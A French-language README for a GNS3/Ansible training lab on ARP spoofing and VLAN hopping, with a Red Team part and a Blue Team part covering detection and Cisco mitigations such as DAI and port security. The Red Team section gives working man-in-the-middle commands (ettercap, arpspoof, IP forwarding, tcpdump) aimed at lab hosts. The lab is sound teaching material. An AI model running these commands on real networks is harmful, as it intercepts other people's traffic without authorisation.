# Lab 18: ARP and VLAN Attacks - Red Team / Blue Team

Ce lab couvre les attaques Layer 2 (ARP Spoofing, VLAN Hopping) et leurs mitigations avec une **vraie VM Kali Linux** pour pratiquer les attaques.

## Table des matières

1. [Objectifs](#objectifs)
2. [Prérequis](#prérequis)
3. [Architecture](#architecture)
4. [Démarrage rapide](#démarrage-rapide)
5. [Connexion à Kali](#connexion-à-kali)
6. [Exercices Red Team](#exercices-red-team)
7. [Exercices Blue Team](#exercices-blue-team)
8. [Commandes de référence](#commandes-de-référence)

---

## Objectifs

### Red Team (Attaque)
- Comprendre le fonctionnement d'ARP et ses vulnérabilités
- **Pratiquer l'ARP Spoofing** avec ettercap, arpspoof, scapy
- Comprendre les attaques VLAN Hopping (Switch Spoofing, Double Tagging)

### Blue Team (Défense)
- Détecter les attaques avec ARPwatch, Wireshark, logs Cisco
- Configurer Dynamic ARP Inspection (DAI)
- Implémenter Port Security, BPDU Guard, Storm Control

---

## Prérequis

- **Ansible** (`brew install ansible`)
- **Python 3**
- **GNS3** connecté au serveur distant

---

## Architecture

```
18_arp_vlan_attacks/
├── ansible.cfg
├── inventory.yml
├── site.yml
├── group_vars/all.yml
├── README.md
├── switch_info.yml           # Généré automatiquement
├── playbooks/
│   ├── 00_full_lab.yml       # Setup complet (idempotent)
│   ├── 01_create_topology.yml
│   ├── 02_configure_base.yml
│   ├── 03_arp_spoofing.yml   # RED: Théorie ARP
│   ├── 04_vlan_hopping.yml   # RED: Théorie VLAN
│   ├── 05_detection.yml      # BLUE: Détection
│   ├── 06_mitigation.yml     # BLUE: Protections
│   └── 07_add_kali.yml       # Ajouter VM Kali
└── scripts/
    └── cisco_cli.py
```

### Topologie

```
                  ┌─────────────────┐
                  │  KALI-ATTACKER  │  ← VM Kali Linux (Docker)
                  │  192.168.10.100 │     ettercap, arpspoof, tcpdump...
                  └────────┬────────┘
                           │ e0/1
  ┌─────────┐       ┌──────┴──────┐       ┌─────────┐
  │  ALICE  │       │     SW1     │       │   BOB   │
  │ .10.10  │───────│  (Target)   │───────│ .10.20  │
  └─────────┘  e0/2 │             │ e0/3  └─────────┘
                    └──────┬──────┘
                           │ e0/0 (trunk)
                    ┌──────┴──────┐
                    │     SW2     │
                    │  (Gateway)  │
                    │  .10.254    │
                    └─────────────┘
```

| Host          | IP              | Type   | Rôle           |
|---------------|-----------------|--------|----------------|
| KALI-ATTACKER | 192.168.10.100  | Docker | Attaquant      |
| ALICE         | 192.168.10.10   | VPCS   | Victime 1      |
| BOB           | 192.168.10.20   | VPCS   | Victime 2      |
| SW1           | 192.168.10.1    | IOU L2 | Switch cible   |
| SW2           | 192.168.10.254  | IOU L2 | Gateway        |

---

## Démarrage rapide

```bash
cd 18_arp_vlan_attacks

# 1. Créer le lab (switches + ALICE + BOB)
ansible-playbook playbooks/00_full_lab.yml

# 2. Ajouter la VM Kali Linux
ansible-playbook playbooks/07_add_kali.yml
```

**Note:** Les playbooks sont **idempotents** - tu peux les relancer sans erreur.

---

## Connexion à Kali

### 1. Se connecter via telnet

```bash
# Le port est affiché à la fin du playbook 07_add_kali.yml
# Exemple: telnet 192.168.156.183 5010
telnet <IP_SERVEUR_GNS3> <PORT_KALI>
```

### 2. Configurer le réseau (dans Kali)

```bash
# Configurer l'IP
ip addr add 192.168.10.100/24 dev eth0
ip link set eth0 up
ip route add default via 192.168.10.254

# Vérifier
ip addr show eth0
ping 192.168.10.10   # ALICE
ping 192.168.10.20   # BOB
```

### 3. Installer les outils d'attaque

```bash
apt update
apt install -y ettercap-text-only dsniff arpwatch tcpdump nmap net-tools
```

---

## Exercices Red Team

### ARP Spoofing - Pratique sur Kali

```bash
# 1. Activer le forwarding IP (pour MitM)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP Spoofing avec Ettercap
ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//
# -T = text mode
# -M arp:remote = MitM ARP spoofing
# Intercepte le trafic entre ALICE et BOB

# 3. ARP Spoofing avec arpspoof (dsniff)
arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20
# -t = target (victime)
# -r = bidirectionnel

# 4. Sniffer le trafic intercepté
tcpdump -i eth0 -n host 192.168.10.10

# 5. Voir la table ARP (vérifier le poisoning)
arp -a
```

### ARP Spoofing - Théorie (Ansible)

```bash
ansible-playbook playbooks/03_arp_spoofing.yml -e "exercise=view_arp"
ansible-playbook playbooks/03_arp_spoofing.yml -e "exercise=arp_process"
ansible-playbook playbooks/03_arp_spoofing.yml -e "exercise=attack_demo"
```

### VLAN Hopping - Théorie (Ansible)

```bash
ansible-playbook playbooks/04_vlan_hopping.yml -e "exercise=explain"
ansible-playbook playbooks/04_vlan_hopping.yml -e "exercise=switch_spoofing"
ansible-playbook playbooks/04_vlan_hopping.yml -e "exercise=double_tagging"
```

---

## Exercices Blue Team

### Détection

```bash
ansible-playbook playbooks/05_detection.yml -e "exercise=arpwatch"
ansible-playbook playbooks/05_detection.yml -e "exercise=wireshark"
ansible-playbook playbooks/05_detection.yml -e "exercise=cisco_logs"
```

### Mitigation - Protections Cisco

```bash
# Dynamic ARP Inspection
ansible-playbook playbooks/06_mitigation.yml -e "exercise=dai"

# Port Security
ansible-playbook playbooks/06_mitigation.yml -e "exercise=port_security"

# Sécurisation VLAN (DTP off)
ansible-playbook playbooks/06_mitigation.yml -e "exercise=vlan_security"

# BPDU Guard
ansible-playbook playbooks/06_mitigation.yml -e "exercise=bpdu_guard"

# APPLIQUER TOUTES LES PROTECTIONS
ansible-playbook playbooks/06_mitigation.yml -e "exercise=apply_all"

# Vérifier l'état
ansible-playbook playbooks/06_mitigation.yml -e "exercise=verify"
```

---

## Commandes de référence

### Accès console

```bash
# Voir switch_info.yml pour les ports après création du lab
telnet <IP_SERVEUR_GNS3> <PORT>
```

### Commandes Cisco - Diagnostic

| Commande | Description |
|----------|-------------|
| `show ip arp` | Table ARP |
| `show mac address-table` | Table MAC |
| `show interfaces trunk` | Trunks actifs |
| `show port-security` | État Port Security |
| `show ip arp inspection` | État DAI |

### Commandes Kali - Attaque

| Commande | Description |
|----------|-------------|
| `ettercap -T -M arp:remote /IP1// /IP2//` | ARP MitM |
| `arpspoof -i eth0 -t VICTIM -r GATEWAY` | ARP Spoofing |
| `tcpdump -i eth0 -n` | Sniffer trafic |
| `nmap -sn 192.168.10.0/24` | Scan réseau |
| `arp -a` | Voir table ARP |

---

## Résumé des protections (CCNA)

| Protection | Contre | Commande clé |
|------------|--------|--------------|
| DAI | ARP Spoofing | `ip arp inspection vlan X` |
| Port Security | MAC Flooding | `switchport port-security` |
| DHCP Snooping | Rogue DHCP | `ip dhcp snooping` |
| DTP off | Switch Spoofing | `switchport nonegotiate` |
| Native VLAN | Double Tagging | `switchport trunk native vlan 999` |
| BPDU Guard | Rogue Switches | `spanning-tree bpduguard enable` |

---

## Troubleshooting

### Les playbooks échouent
Les playbooks sont idempotents, tu peux les relancer.

### Kali n'a pas de connectivité
```bash
# Dans Kali
ip addr show eth0          # Vérifier l'IP
ping 192.168.10.254        # Tester gateway
```

### Les outils ne sont pas installés
```bash
apt update && apt install -y ettercap-text-only dsniff tcpdump nmap
```

### Connexion telnet refusée
Le node n'est pas démarré. Dans GNS3 GUI → Start le node.
